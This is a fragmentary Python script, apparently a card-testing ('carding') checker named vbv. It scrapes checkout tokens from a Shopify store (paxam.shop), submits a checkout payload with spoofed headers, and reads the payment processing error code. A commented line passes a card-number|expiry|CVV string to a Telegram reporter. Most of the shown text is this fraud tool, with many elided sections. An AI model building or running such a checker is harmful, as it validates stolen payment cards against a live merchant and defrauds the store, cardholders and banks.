...
def vbv(ccx):
    ...
    response = session.get('https://paxam.shop/cart.js', params=params, 
 headers=headers)
    ...
    response = session.get(f'https://paxam.shop/checkouts/cn/{chk_token}', headers=headers)

# Updated regex patterns to match actual structure
...
# Extract actual values from match objects, or set to None if not found
...
# Check if all tokens were found
    if (
        ...
        print("Queue Token:", queue_token)
        print("Stable ID:", stable_id)
        print("Payment Method ID:", paymentMethodIdentifier)
    time.sleep(0.5)
    ...
    'variables': {
        'input': {
            ...
            'note': {
                ...
                'customAttributes': [
                    {
                        'key': '__route_cart_id',
                        'value': '84403c7b-2497-44b8-8fe6-8b2ee3a165b8',
                    },
                ],
            },
        ...
        'attemptToken': f'{chk_token}-9bw03y06zyl',
        'metafields': [],
        'analytics': {
    ...
    'x-checkout-one-session-token': chk_token,
    'x-checkout-web-build-id': '0cc063ad1bfa22c39a589145e2a1b66463881ee8',
    'x-checkout-web-deploy-stage': 'production',
    'x-checkout-web-server-handling': 'fast',
    'x-checkout-web-server-rendering': 'yes',
...
# 🔐 Check for action required
        ...
        try:
            MKN = response.json()['data']['receipt']['processingError']['code']
            print(MKN)
...
#Tele("4258810718226890|02|2027|653")                                    
# Example usage
